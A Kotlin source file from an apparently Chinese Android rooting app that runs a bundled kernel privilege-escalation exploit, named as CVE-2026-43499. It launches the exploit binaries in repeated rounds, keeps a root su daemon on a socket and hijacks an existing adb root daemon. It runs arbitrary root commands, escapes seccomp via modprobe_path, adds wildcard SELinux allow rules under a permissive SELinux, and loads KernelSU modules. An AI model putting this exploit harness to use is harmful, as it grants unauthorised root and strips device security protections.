package com.neoroot.ksuonetap.deploy

import android.content.Context
import android.content.Intent
import android.util.Log
import com.neoroot.ksuonetap.core.DeviceGate
import com.neoroot.ksuonetap.core.Progress
import java.io.File

/**
 * GhostLock (CVE-2026-43499) 执行流 —— 适用于 [DeviceGate.GHOSTLOCK_BUILDS] 里的版本。
 *
 * **设计对齐 GhostLock App 的运行时模型**（YuKongA/ghostlock-app, src/core/session/）:
 *
 *   1. profile 门槛 —— App 按 `uname -r` 精确匹配内置 HOCON profile，无 profile 拒跑。
 *      这里同构：启动前读 `/proc/sys/kernel/osrelease`，与 assets 里该版本
 *      `kernel_profile.conf` 的 `release` 字段精确比对，不匹配直接拒绝。
 *   2. runtime home —— App 以 `filesDir` 为 home，启动时落 `profile.conf`
 *      （"runtime profile written"），shot 日志命名 `ghostlock-direct-<n>.log`。
 *      这里同构布局。
 *   3. cpu pair —— App 用 profile 的 `recommended_cpus`（main=3 consumer=4，即
 *      8550 的两颗大核）。这里改为**运行时实测**: 读各核 `cpufreq/cpuinfo_max_freq`
 *      取频率最高的两颗（main=最高、consumer=次高），检测失败回退 profile 值。
 *   4. 无 Shizuku —— exploit 全程无特权（futex PI requeue 链），二进制随 APK 的
 *      `lib/arm64-v8a/` 打包（**来自 ghostlock-ksu-full-kit 的 LPE**），从
 *      `nativeLibraryDir` 直接执行。
 *   5. vehicle —— mcast（GhostLock App 同款）。注意: exploit 的 socket 依赖
 *      manifest 的 **INTERNET 权限**（内核 paranoid networking: 无此权限的进程
 *      没有 inet(3003) 组，`socket(AF_INET)` 直接 EPERM——曾误判为 vivo 网络管控）。
 *
 * 与 App 的实现差异（有意的）:
 *   - LPE 是 loader+payload 两件（kit 的 `cve-2026-43499-root --run-payload`），
 *     loader 自带 su daemon —— root 交付走**驻留 unix socket**（`SU_SOCK_PATH`
 *     指向 app 私有目录，enforcing 下可达），供 App 内终端「临时 root」通道复用；
 *     App 自己则是 root script (.ghostlock_root.sh) + manager 交付。
 *   - offsets 全部编译期内置（PD2338 5.15.197 专版构建），不消费 HOCON 其余字段；
 *     profile.conf 落盘只为对齐 App 的 runtime 语义与留档诊断。
 */
class GhostlockRunner(
    private val ctx: Context,
    private val log: (String) -> Unit
) {
    companion object {
        const val TAG = "GHOSTLOCK"
        const val LOADER_LIB = "libghostlock_root.so"
        const val PAYLOAD_LIB = "libghostlock_payload.so"
        const val PROFILE_ASSET = "kernel_profile.conf"   // assets/<buildDir>/ 下
        const val SOCK_NAME = "gl_su.sock"
        /** adb 手动 CLI 链的 daemon 默认 socket（无 SU_SOCK_PATH 时的内置路径）。 */
        const val SOCK_TMP = "/data/local/tmp/temp_su.sock"
        const val TIMEOUT_MS = 12 * 60 * 1000L   // FULL 模式实测 ~3-4 分钟, 留余量

        /** KSU 部署产物名（= DeployScript 同名常量; 版本绑定件在 assets/<buildDir>/ 下）。
         *  2026-10-06 起换原版 KernelSU: ko = v3.3.0 官方源码混血树重编 (KSU_VERSION 32601,
         *  vermagic 5.15.197 与设备逐字一致, GhostLock App v4 同款真机验证), 管理器 =
         *  官方 KernelSU_v3.3.0-release.apk (ko 内嵌签名白名单认它)。 */
        const val KSU_KO = "kernelsu-vanilla-197.ko"
        const val VRPATCH_KO = "vrpatch.ko"
        const val KSUD = "ksud"
        const val MANAGER_APK = "KernelSU.apk"
        const val MANAGER_PKG = "me.weishu.kernelsu"

        /** 最近一次成功运行的实例 —— Terminal 的 ghostlock 通道用它拿 ctx 相关路径。 */
        @Volatile
        var latest: GhostlockRunner? = null
            private set
    }

    private val nativeDir: String = ctx.applicationInfo.nativeLibraryDir
    private val loader: File get() = File(nativeDir, LOADER_LIB)
    private val payload: File get() = File(nativeDir, PAYLOAD_LIB)
    private val sockPath: String get() = File(ctx.filesDir, SOCK_NAME).absolutePath

    /** 本发 shot 日志（App 命名: ghostlock-direct-<n>.log），run() 时确定。 */
    var shotLog: File = File(ctx.filesDir, "ghostlock-direct-0.log")
        private set

    /** daemon socket 是否在位 (= 临时 root 通道可用)。
     *  两条通道: ① App 自己的 daemon (filesDir socket) ② **接管 adb 手动 CLI 链**
     *  的 daemon (/data/local/tmp/temp_su.sock —— 手动发射的链不带 SU_SOCK_PATH,
     *  daemon 绑默认路径; W1 落地后 SELinux permissive, app 域可连接)。 */
    fun rootReady(): Boolean =
        File(ctx.filesDir, SOCK_NAME).exists() || File(SOCK_TMP).exists()

    /** ghostlock 通道执行一条 root 命令: 优先 App 自己的 daemon, 其次接管
     *  adb 手动 CLI 链的 daemon (同一 client 二进制, 只换 SU_SOCK_PATH)。 */
    fun runAsRoot(cmd: String, timeoutMs: Long = 30_000): String {
        val sock = if (File(ctx.filesDir, SOCK_NAME).exists()) sockPath else SOCK_TMP
        val pb = ProcessBuilder(loader.absolutePath, "-c", cmd)
        pb.environment()["SU_SOCK_PATH"] = sock
        val p = pb.start()
        val out = p.inputStream.bufferedReader().use { it.readText() }
        val err = p.errorStream.bufferedReader().use { it.readText() }
        if (!p.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)) {
            p.destroyForcibly()
            return "!! ghostlock client 超时"
        }
        return (out + err).trim()
    }

    // ---------- profile (App 语义) ----------

    /** assets 里该版本的 profile 原文; null = 无 profile。 */
    private fun loadProfileConf(buildDir: String): String? = runCatching {
        ctx.assets.open("$buildDir/$PROFILE_ASSET").bufferedReader().use { it.readText() }
    }.getOrNull()

    /** 提取 `release = "..."`。 */
    private fun profileRelease(conf: String): String? =
        Regex("release\\s*=\\s*\"([^\"]+)\"").find(conf)?.groupValues?.get(1)

    /** 提取 recommended_cpus { main = X consumer = Y }。 */
    private fun profileCpus(conf: String): Pair<Int, Int>? {
        val block = Regex("recommended_cpus\\s*\\{([^}]*)\\}").find(conf)?.groupValues?.get(1)
            ?: return null
        val main = Regex("\\bmain\\s*=\\s*(\\d+)").find(block)?.groupValues?.get(1)?.toInt()
        val consumer = Regex("\\bconsumer\\s*=\\s*(\\d+)").find(block)?.groupValues?.get(1)?.toInt()
        return if (main != null && consumer != null) main to consumer else null
    }

    /** 当前内核 release（uname -r）。
     *  用 uname(2)（同 App 的 native runtime）—— untrusted_app 读
     *  /proc/sys/kernel/osrelease 会被 enforcing 的 sepolicy 拒（实测 null）。 */
    private fun kernelRelease(): String? = runCatching {
        android.system.Os.uname().release.trim()
    }.getOrElse { runCatching {
        File("/proc/sys/kernel/osrelease").readText().trim()
    }.getOrNull() }

    // ---------- cpu pair (App: recommended_cpus, 这里实测) ----------

    /**
     * 实测竞态核对 —— **同簇两颗大核**（GhostLock App 同款: 本机即 3/4 @2.8GHz）。
     * 不选超大核: App 的 cgroup cpuset 常不含 prime 核，pin 上去 sched_setaffinity
     * 直接 EINVAL (2026-10-03 实测)。逻辑: 按最大频率聚类, 取"核数≥2 的最高频簇"
     * 里序号最小的两颗; 没有同频簇则回退 profile 值。
     */
    private fun detectCpuPair(): Pair<Int, Int>? {
        val freqs = mutableListOf<Pair<Int, Long>>()
        runCatching {
            File("/sys/devices/system/cpu").listFiles()?.forEach { d ->
                val m = Regex("^cpu(\\d+)$").find(d.name) ?: return@forEach
                val f = File(d, "cpufreq/cpuinfo_max_freq").readText().trim().toLongOrNull()
                    ?: return@forEach
                freqs += m.groupValues[1].toInt() to f
            }
        }.getOrNull() ?: return null
        val clusters = freqs.groupBy({ it.second }, { it.first })
            .filter { it.value.size >= 2 }
        val cluster = clusters.maxByOrNull { it.key } ?: return null
        val cs = cluster.value.sorted()
        return cs[0] to cs[1]
    }

    /** 完整执行流。返回 true = 临时 root 就绪 (daemon 驻留, [runAsRoot] 可用)。 */
    fun run(): Boolean {
        Progress.start("GhostLock 提权")
        try {
            if (!loader.exists() || !payload.exists()) {
                Progress.fail("exploit 缺失 (nativeLibraryDir)")
                log("!! 缺 ${loader.name} 或 ${payload.name} —— APK 打包缺 lib/arm64-v8a/")
                return false
            }

            Progress.set(5, "匹配内核 profile")
            val info = DeviceGate.probe(shellOk = false)
            if (!DeviceGate.isGhostlockBuild(info.buildDir)) {
                Progress.fail("本版本不走 GhostLock 执行流")
                log("!! buildDir=${info.buildDir} 不在 GhostLock 清单")
                return false
            }

            // [App 语义 1] profile 精确匹配: uname -r vs assets profile release
            val conf = loadProfileConf(info.buildDir)
            if (conf == null) {
                Progress.fail("无可用内核 profile")
                log("!! assets/${info.buildDir}/$PROFILE_ASSET 缺失")
                return false
            }
            val release = profileRelease(conf)
            val uname = kernelRelease()
            log("== GhostLock (CVE-2026-43499) 执行流 ==")
            log("profile: hasProfile=true release=$release")
            log("kernel: $uname")
            if (release == null || uname != release) {
                Progress.fail("内核版本与 profile 不匹配")
                log("!! uname -r ($uname) != profile release ($release) —— 拒跑 (同 App 无 profile 语义)")
                return false
            }

            // [App 语义 2] runtime home: filesDir 落 profile.conf + shot 日志轮转
            val profileConf = File(ctx.filesDir, "profile.conf")
            runCatching { profileConf.writeText(conf) }
            log("runtime profile written: ${profileConf.name}")
            var idx = 0
            while (File(ctx.filesDir, "ghostlock-direct-$idx.log").exists()) idx++
            shotLog = File(ctx.filesDir, "ghostlock-direct-$idx.log")

            // [App 语义 3] cpu pair: 实测同簇大核, 回退 profile recommended_cpus
            val detected = detectCpuPair()
            val pair = detected ?: profileCpus(conf) ?: (0 to 1)
            val (mainCpu, consumerCpu) = pair
            log("cpu pair: main=$mainCpu consumer=$consumerCpu" +
                (if (detected != null) " (max_freq detected)" else " (profile fallback)"))

            log("⚠️ 请**锁屏静置**: 竞态窗口对后台负载极其敏感 (负载下命中率 0)")

            // 接管检查: adb 手动 CLI 链已在位 (W1→permissive, app 域可连接其 socket)
            if (File(SOCK_TMP).exists()) {
                val id = runCatching { runAsRoot("id", 10_000) }.getOrNull().orEmpty()
                if (id.contains("uid=0")) {
                    log("== 发现 adb 手动 CLI 链 root ($SOCK_TMP), 直接接管 ==")
                    log("id -> $id")
                    latest = this
                    log("*** 临时 ROOT OK (接管已有 CLI 链; App 内终端即刻可用) ***")
                    Progress.finish("临时 root 就绪 (接管 CLI 链)")
                    return true
                }
                log("temp socket 在但校验失败, 继续自发射")
            }

            // 清掉上一发的 socket (daemon 若还活着会重建)
            File(ctx.filesDir, SOCK_NAME).delete()

            Progress.set(15, "启动 GhostLock exploit")
            // vivo cleaner 会猎杀 fire 窗口期的 exploit 进程（2026-10-05 凌晨实测:
            // 连环静默死 —— 无 am_kill、无 tombstone、死亡点都在 mcast route 阶段,
            // 且间隔渐短 = 升级式猎杀; GL_W2_SECCOMP=0 对照排除与 W2s 的关联）。
            // CLI setsid 挂的孤儿进程必被杀, App 进程树有前台保护但也可能中招
            // —— 所以支持多轮发射, 每轮独立 shot 日志, ROOTED 即止。
            val maxRounds = 3
            var rooted = false
            var exitCode: Int? = null
            for (round in 1..maxRounds) {
                if (round > 1) {
                    log("== [1] 第 $round/$maxRounds 轮发射（上一轮 payload 提前死亡）==")
                    Thread.sleep(5_000)
                    var idx = 0
                    while (File(ctx.filesDir, "ghostlock-direct-$idx.log").exists()) idx++
                    shotLog = File(ctx.filesDir, "ghostlock-direct-$idx.log")
                } else {
                    log("== [1] 启动 exploit (app 进程树, 无需 Shizuku) ==")
                }
                val pb = ProcessBuilder(
                    loader.absolutePath, "--run-payload",
                    payload.absolutePath, loader.absolutePath, shotLog.absolutePath
                ).apply {
                    environment()["GL_W2"] = "1"
                    environment()["GL_W2_FULL"] = "1"
                    // mcast vehicle —— GhostLock App 同款 (slide/main=pselect 仅其 KMI
                    // 兜底; 本设备全部成功 CLI 发射都是 mcast)。此前 app 域 socket
                    // EPERM 的真根因是 manifest 缺 INTERNET 权限: 内核 paranoid
                    // networking 下无 inet(3003) 组 → socket(AF_INET) 直接 EPERM,
                    // 与 vivo 网络管控无关。已加 INTERNET 权限 (2026-10-03)。
                    environment()["RECLAIM_VEHICLE"] = "mcast"
                    environment()["GHOSTLOCK_MAIN_CPU"] = mainCpu.toString()
                    environment()["GHOSTLOCK_CONSUMER_CPU"] = consumerCpu.toString()
                    environment()["SU_SOCK_PATH"] = sockPath
                    // daemon 按 SO_PEERCRED 校验对端 uid: 默认只放 shell(2000)。
                    // 不传这个, App 自己的 client(uid 10335) 会被拒 -> "su: permission denied"
                    // (2026-10-03 17:06 实测)。
                    environment()["SU_APP_UID"] = android.os.Process.myUid().toString()
                    redirectErrorStream(true)
                }
                val proc = pb.start()
                log("exploit 已启动 loader=${loader.absolutePath}")
                log("debug dump: ${shotLog.absolutePath}")
                // ⚠️ exploit 的全部输出被 loader 重定向进 shotLog（payload_runner_main 的
                // dup2），stdout 管道里**永远不会有内容** —— 监控必须盯文件增量。

                Progress.set(30, "等待提权（请保持锁屏静置）")
                val deadline = System.currentTimeMillis() + TIMEOUT_MS
                var readOff = 0L
                exitCode = null
                val startedAt = System.currentTimeMillis()

                fun drain(from: Long, upto: Long) {
                    if (upto <= from) return
                    runCatching {
                        shotLog.inputStream().use { ins ->
                            ins.channel.position(from)
                            val buf = ByteArray((upto - from).toInt().coerceAtMost(1 shl 20))
                            var off = 0
                            while (off < buf.size) {
                                val n = ins.read(buf, off, buf.size - off)
                                if (n <= 0) break
                                off += n
                            }
                            String(buf, 0, off).lineSequence().forEach { line ->
                                val t = line.trim()
                                if (t.isNotEmpty()) {
                                    log(t)
                                    if (t.contains("ROOTED") || t.contains("ROOT child pid=")) rooted = true
                                }
                            }
                        }
                    }
                }

                while (System.currentTimeMillis() < deadline) {
                    val len = shotLog.length()
                    if (len > readOff) { drain(readOff, len); readOff = len }

                    if (!proc.isAlive) {
                        exitCode = runCatching { proc.exitValue() }.getOrNull()
                        // 进程死后再读一次文件尾部（缓冲可能已 flush）
                        val len2 = shotLog.length()
                        drain(readOff, len2); readOff = len2
                        log("exploit 进程退出 code=$exitCode" +
                            when {
                                exitCode == null -> ""
                                exitCode == 255 -> " (= exit(-1), exploit 自身前置检查失败)"
                                exitCode == 254 -> " (= exit(-2))"
                                exitCode != null && exitCode >= 128 ->
                                    " (= 128+signal ${exitCode - 128}; 31=SIGSYS/seccomp, 9=SIGKILL, 11=SIGSEGV)"
                                else -> ""
                            })
                        break
                    }
                    if (rooted) break

                    val now = System.currentTimeMillis()
                    val secs = (now - startedAt) / 1000
                    Progress.set(30 + (secs * 60 / (TIMEOUT_MS / 1000)).toInt().coerceAtMost(60),
                        "等待提权（第 $round 轮, 已 ${secs}s, 请保持静置）")
                    Thread.sleep(800)
                }
                if (rooted) break
                // 本轮未中且 exploit 还挂着（异常）—— 收掉再重试
                if (proc.isAlive) proc.destroyForcibly()
            }

            if (!rooted) {
                // 兜底: 自发射未命中, 但窗口内 adb 手动 CLI 链可能已命中
                if (File(SOCK_TMP).exists()) {
                    val id = runCatching { runAsRoot("id", 10_000) }.getOrNull().orEmpty()
                    if (id.contains("uid=0")) {
                        log("== 自发射未命中, 但检测到 adb CLI 链 root, 接管 ==")
                        latest = this
                        log("*** 临时 ROOT OK (接管 CLI 链) ***")
                        Progress.finish("临时 root 就绪 (接管 CLI 链)")
                        return true
                    }
                }
                log("!! 未观察到 ROOTED 标记 (exitCode=$exitCode)")
                log("!! shot 日志全文在: ${shotLog.absolutePath}")
                Progress.fail("未命中 (exitCode=$exitCode)")
                return false
            }

            // 等 daemon socket 就位 (ROOTED 日志后 fork+exec 需要一两秒)
            Progress.set(92, "等待 su daemon 驻留")
            var ready = false
            repeat(15) {
                if (rootReady()) { ready = true; return@repeat }
                Thread.sleep(1_000)
            }
            if (!ready) {
                log("!! ROOTED 但 daemon socket 未就位: $sockPath")
                Progress.fail("daemon 未就绪")
                return false
            }

            // 验证: 经 daemon 跑一条 id。带重试 —— stale socket 会让首次
            // connect ECONNREFUSED（daemon 可能刚 fork 还没 bind, 也可能是
            // cleaner 击杀了 daemon 但 socket 文件还在）, 21:24 实测单发必挂。
            Progress.set(96, "校验 root")
            var id = ""
            var attempt = 0
            while (attempt < 20 && !id.contains("uid=0")) {
                attempt++
                id = runCatching { runAsRoot("id", 8_000) }.getOrNull().orEmpty()
                if (id.contains("uid=0")) break
                log("id 尝试 $attempt/20: ${id.ifEmpty { "(连接失败)" }}")
                Thread.sleep(1_500)
            }
            log("id -> $id")
            if (!id.contains("uid=0")) {
                log("!! root 校验失败")
                Progress.fail("root 校验失败")
                return false
            }

            log("== GhostLock 临时 root 就绪 ==")
            latest = this
            log("通道: 终端「临时 root」/ runAsRoot(); socket: $sockPath")
            log("注意: per-boot —— 重启后重打一次; shot 日志: ${shotLog.absolutePath}")
            log("*** 临时 ROOT OK (GhostLock / CVE-2026-43499, 未部署 KSU, 无 Shizuku) ***")
            Progress.finish("临时 root 就绪 (GhostLock)")
            log("想接着上 KernelSU: 点主界面的「激活 KSU」(不用重跑漏洞)")
            return true
        } catch (t: Throwable) {
            log("GhostLock 执行异常: $t")
            Log.e(TAG, "run", t)
            Progress.fail("执行异常")
            return false
        }
    }

    // ---------- 激活 KSU (GhostLock 版, 无 Shizuku) ----------

    /** 读 assets 产物到 filesDir; 返回 null = 缺文件（已 log）。 */
    private fun extractAsset(assetPath: String, targetName: String): File? {
        val data = runCatching {
            ctx.assets.open(assetPath).use { input ->
                val bos = java.io.ByteArrayOutputStream()
                val buf = ByteArray(64 * 1024)
                while (true) {
                    val n = input.read(buf)
                    if (n <= 0) break
                    bos.write(buf, 0, n)
                }
                bos.toByteArray()
            }
        }.getOrNull()
        if (data == null) {
            log("!! 缺 asset: $assetPath")
            return null
        }
        val f = File(ctx.filesDir, targetName)
        f.writeBytes(data)
        return f
    }

    /**
     * 「激活 KSU」: GhostLock 执行流版本的 KSU 部署 —— 无 Shizuku, 全程走 daemon。
     *
     * 前置: [run] 已成功（daemon 驻留）。三个关键点:
     *
     *  1. **su 通道的 seccomp 逃逸**: App 进程树派生的 daemon 继承 app 域 seccomp
     *     白名单（无 init_module），`ksud insmod` 会被杀。exploit 的 daemon 已内置
     *     逃逸（modprobe_path → call_usermodehelper 起无 seccomp 的内核助手执行
     *     命令），这里直接用即可。
     *  2. **宽容模式**: 本内核上 KSU + SELinux enforcing 会断网（vivo netb 过滤器
     *     enforce 特异性丢包，见 assets/<buildDir>/SYSTEM.txt），所以部署脚本在
     *     加载完成后 `setenforce 0` —— **保持宽容模式是本版本的已知约束**。
     *  3. **顺序（2026-10-05 GhostLock App 真机实测结论）**: 原版 KernelSU 的 init
     *     会在模块加载后收掉同会话脚本 —— 所以 vrpatch / packet sepolicy 全部
     *     移到 `ksud insmod <vanilla ko>` **之前**（pre-KSU 窗口），insmod 是
     *     脚本最后一步; 管理器不走脚本 `pm install`（exploit/内核助手域拿不到
     *     package 服务: "Can't find service: package"），改由 App 侧
     *     PackageInstaller 会话免 root 唤起系统安装器（GhostLock App v4 同款）。
     *
     * 全程单条 `su -c` 脚本: 保证 pre-KSU 段原子跑完。
     */
    fun activateKsu(): Boolean {
        Progress.start("激活 KernelSU")
        try {
            if (!rootReady()) {
                log("!! 没检测到 GhostLock 临时 root —— 请先「一键 Root」")
                Progress.fail("需要先提取临时 root")
                return false
            }
            val buildDir = DeviceGate.resolveBuildDir()

            Progress.set(10, "提取 KSU 部署产物")
            log("== [1] 提取 KSU 产物 (assets/$buildDir) ==")
            val ksuKo = extractAsset("$buildDir/$KSU_KO", KSU_KO)
            val vrKo = extractAsset("$buildDir/$VRPATCH_KO", VRPATCH_KO)
            val ksud = extractAsset(KSUD, KSUD)
            val manager = extractAsset(MANAGER_APK, MANAGER_APK)
            if (ksuKo == null || vrKo == null || ksud == null || manager == null) {
                log("!! KSU 产物不齐 —— 无法部署")
                Progress.fail("产物缺失")
                return false
            }
            log("[deploy] ${KSU_KO} (${ksuKo.length()}B), ${VRPATCH_KO} (${vrKo.length()}B), " +
                "$KSUD (${ksud.length()}B), $MANAGER_APK (${manager.length()}B)")

            // 先把 ksud 落到 /data/adb（sucompat 硬依赖路径），ko 落 /data/local/tmp
            // （与 adb 手动链一致，终端快捷命令引用这些路径）。
            Progress.set(20, "推送部署文件")
            val push = runAsRoot(
                "mkdir -p /data/adb && " +
                    "cp ${ksud.absolutePath} /data/adb/$KSUD && chmod 755 /data/adb/$KSUD && " +
                    "cp ${ksuKo.absolutePath} ${vrKo.absolutePath} /data/local/tmp/ && " +
                    "chmod 755 /data/local/tmp/$KSU_KO /data/local/tmp/$VRPATCH_KO && echo pushed",
                60_000
            )
            log(push)
            if (!push.contains("pushed")) {
                log("!! 部署文件推送失败")
                Progress.fail("推送失败")
                return false
            }

            Progress.set(45, "加载 KernelSU 驱动")
            log("== [2] pre-KSU: vrpatch + sepolicy（原版 KSU init 会杀脚本, 必须先做）==")
            val script = buildString {
                append("export PATH=/data/local/tmp:/system/bin:\$PATH\n")
                append("echo '== [2a] vrpatch.ko (pre-KSU) =='\n")
                append("/data/adb/$KSUD insmod /data/local/tmp/$VRPATCH_KO\n")
                append("echo \"vr_rc=\$?\"\n")
                append("echo '== [2b] packet sepolicy (pre-KSU, netd DNS) =='\n")
                append("/data/adb/$KSUD sepolicy patch 'allow * unlabeled:packet send'\n")
                append("/data/adb/$KSUD sepolicy patch 'allow * unlabeled:packet recv'\n")
                append("echo '== [2c] 宽容模式确认 (W1 已置宽容; 本版本 KSU+enforcing 断网) =='\n")
                append("getenforce\n")
                append("echo '*** PRE_KSU_DONE ***'\n")
                append("echo '== [3] kernelsu-vanilla-197.ko (最后一步; 之后脚本会被 KSU init 收掉) =='\n")
                append("/data/adb/$KSUD insmod /data/local/tmp/$KSU_KO\n")
                append("echo \"ksu_rc=\$?\"\n")
                append("echo '== [4] 模块确认 =='\n")
                append("grep -E 'kernelsu|vrpatch' /proc/modules\n")
                append("echo '*** GHOSTLOCK KSU DEPLOY DONE ***'\n")
            }
            val out = runAsRoot(script, 300_000)
            log(out.ifBlank { "(无输出)" })

            // 原版 KSU 的 init 在模块加载后可能连脚本一起收掉 —— DONE / ksu_rc 打不出
            // 来**不算失败**: PRE_KSU_DONE + vr_rc=0 已确认前置段全部就位, insmod 是
            // 最后一条, 模块是否真加载以 KernelSU 管理器识别内核 (32601) 为准。
            val preOk = out.contains("PRE_KSU_DONE")
            val vrOk = out.contains("vr_rc=0")
            val ksuRc0 = out.contains("ksu_rc=0")
            val ksuLive = Regex("kernelsu[^\\n]*Live").containsMatchIn(out)
            val doneMarker = out.contains("GHOSTLOCK KSU DEPLOY DONE")
            log("-- 判定: preOk=$preOk vrOk=$vrOk ksuRc0=$ksuRc0 ksuLive=$ksuLive done=$doneMarker")
            if (preOk && vrOk && (ksuRc0 || ksuLive || doneMarker || !out.contains("ksu_rc="))) {
                Progress.set(96, "校验 KSU")
                log("== KSU 部署完成 ==")
                if (!ksuRc0 && !ksuLive) {
                    log("注意: 脚本在 insmod 后被 KSU init 收掉 (无 ksu_rc 回显) —— ")
                    log("      请装好管理器后看「内核 32601」确认驱动状态 (唯一权威)")
                }
                log("注意: daemon 可能已被 KSU 接管杀掉 —— 之后终端请切「KernelSU」通道; manager 里给应用授权")
                log("注意: 本版本需保持宽容模式（W1 已置宽容）; 重启后 root/模块全失, 重跑「一键 Root」+「激活 KSU」")
                log("*** ROOT OK (KernelSU active, GhostLock 链) ***")
                Progress.finish("完成 (KSU active)")
                promptInstallKsuManager()
                return true
            }
            log("!! 部署未完成 (preOk=$preOk, vrOk=$vrOk) —— 按上方输出定位")
            log("提示: vr_rc 非 0 通常是 ko/内核不匹配; ksu_rc 非 0 通常是 daemon seccomp 逃逸失败或 ko/内核不匹配; " +
                "可手动验证: 终端「临时 root」通道执行 /data/adb/$KSUD insmod /data/local/tmp/$KSU_KO")
            Progress.fail("KSU 部署失败")
            return false
        } catch (t: Throwable) {
            log("激活 KSU 异常: $t")
            Log.e(TAG, "activateKsu", t)
            Progress.fail("激活异常")
            return false
        }
    }

    /**
     * 免 root 安装 KernelSU 管理器: PackageInstaller 会话 + PendingIntent 唤起系统安装器
     * （GhostLock App v4 同款, 2026-10-05 真机验证）。
     *
     * 为什么不走脚本 `pm install`: 无论 exploit shell 域还是内核助手域, enforcing/宽容
     * 下都拿不到 binder 里的 package 服务 —— `pm install` → "Can't find service:
     * package"（2026-10-05 三轮实测: enforcing 域、setenforce 0 临时方案、pre-fixup
     * 宽容窗口全灭）。只有 App 自己的 untrusted_app 域能正常发起安装。
     */
    private fun promptInstallKsuManager() {
        runCatching {
            val pm = ctx.packageManager
            runCatching { pm.getPackageInfo(MANAGER_PKG, 0) }.onSuccess {
                log("KernelSU manager 已安装, 跳过安装器唤起")
                return
            }
            val apk = File(ctx.filesDir, MANAGER_APK)
            if (!apk.isFile) {
                log("!! 管理器 APK 缺失: ${apk.absolutePath}")
                return
            }
            if (!pm.canRequestPackageInstalls()) {
                log("提示: 请先授予「安装未知应用」权限 (设置 → 应用 → KSUOneTap)")
            }
            val params = android.content.pm.PackageInstaller.SessionParams(
                android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            val sessionId = pm.packageInstaller.createSession(params)
            pm.packageInstaller.openSession(sessionId).use { session ->
                apk.inputStream().use { input ->
                    session.openWrite("KernelSU.apk", 0, apk.length()).use { sessionOut ->
                        input.copyTo(sessionOut)
                        session.fsync(sessionOut)
                    }
                }
                val launch = pm.getLaunchIntentForPackage(ctx.packageName)
                    ?: Intent(Intent.ACTION_VIEW)
                val pending = android.app.PendingIntent.getActivity(
                    ctx, sessionId, launch,
                    android.app.PendingIntent.FLAG_IMMUTABLE
                        or android.app.PendingIntent.FLAG_UPDATE_CURRENT)
                session.commit(pending.intentSender)
            }
            log("系统安装器已唤起 —— 确认弹窗即完成 KernelSU 管理器安装")
        }.onFailure { log("管理器安装唤起失败: ${it.message}") }
    }
}
